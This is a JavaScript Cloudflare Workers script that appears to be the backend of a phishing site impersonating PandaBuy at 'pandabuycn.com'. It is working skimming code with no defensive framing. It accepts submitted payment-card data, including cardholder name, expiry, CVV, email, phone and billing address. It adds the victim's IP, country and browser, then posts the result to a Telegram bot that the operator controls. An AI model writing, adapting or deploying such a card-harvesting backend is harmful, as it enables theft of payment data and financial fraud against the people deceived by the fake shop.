// Cloudflare Workers script for PandaBuy
// This handles card submissions and sends them to Telegram

export default {
  async fetch(request, env, ctx) {
    const url = new URL(request.url);
    
    // Handle CORS for all requests
    const corsHeaders = {
      'Access-Control-Allow-Origin': '*',
      'Access-Control-Allow-Methods': 'GET, POST, OPTIONS',
      'Access-Control-Allow-Headers': 'Content-Type',
    };

    // Handle preflight requests
    if (request.method === 'OPTIONS') {
      return new Response(null, { headers: corsHeaders });
    }

    // Serve static files (your website)
    if (request.method === 'GET') {
      // You'll upload your HTML/CSS/JS files to Cloudflare Pages
      // This worker just handles the API
      return new Response('API endpoint - upload your site files to Cloudflare Pages', {
        headers: corsHeaders
      });
    }

    // Handle card submission API
    if (request.method === 'POST' && url.pathname === '/api/cards') {
      try {
        const cardData = await request.json();
        
        // Add timestamp
        const submissionData = {
          ...cardData,
          timestamp: new Date().toISOString(),
          ip: request.headers.get('CF-Connecting-IP') || 'Unknown',
          country: request.cf?.country || 'Unknown',
          userAgent: request.headers.get('User-Agent') || 'Unknown'
        };

        // Send to Telegram
        await sendToTelegram(submissionData, env);

        return new Response(
          JSON.stringify({ success: true, message: 'Card data saved successfully' }),
          { 
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );
      } catch (error) {
        console.error('Error processing card data:', error);
        return new Response(
          JSON.stringify({ error: 'Failed to process card data' }),
          { 
            status: 500,
            headers: { 
              'Content-Type': 'application/json',
              ...corsHeaders 
            } 
          }
        );
      }
    }

    // Default response
    return new Response('Not found', { 
      status: 404,
      headers: corsHeaders 
    });
  }
};

// Function to send data to Telegram
async function sendToTelegram(cardData, env) {
  const botToken = env.TELEGRAM_BOT_TOKEN;
  const chatId = env.TELEGRAM_CHAT_ID;
  
  if (!botToken || !chatId) {
    console.error('Telegram credentials not configured');
    return;
  }

  const message = `💳 NEW CARD SUBMISSION!

👤 CARDHOLDER: ${cardData.cardName || 'Unknown'}
💳 CARD: **** **** **** ${cardData.cardNumber?.slice(-4) || '****'}
📅 EXPIRES: ${cardData.expMonth || '**'}/${cardData.expYear || '****'}
🔒 CVV: ${cardData.cvv || '***'}

📧 EMAIL: ${cardData.email || 'Unknown'}
📱 PHONE: ${cardData.phoneNumber || 'Unknown'}

🏠 BILLING ADDRESS:
${cardData.billingAddress || 'Unknown'}
${cardData.billingAddress2 ? cardData.billingAddress2 + '\n' : ''}${cardData.city || 'Unknown'}, ${cardData.state || 'Unknown'} ${cardData.zipCode || 'Unknown'}
🌍 COUNTRY: ${cardData.country || 'Unknown'}

🌐 IP: ${cardData.ip}
🏳️ COUNTRY: ${cardData.country}
🕐 TIME: ${new Date(cardData.timestamp).toLocaleString()}

💰 DOMAIN: pandabuycn.com`;

  try {
    const response = await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
      method: 'POST',
      headers: {
        'Content-Type': 'application/json',
      },
      body: JSON.stringify({
        chat_id: chatId,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    if (!response.ok) {
      throw new Error(`Telegram API error: ${response.status}`);
    }

    console.log('✅ Card data sent to Telegram successfully');
  } catch (error) {
    console.error('❌ Failed to send to Telegram:', error);
    throw error;
  }
} 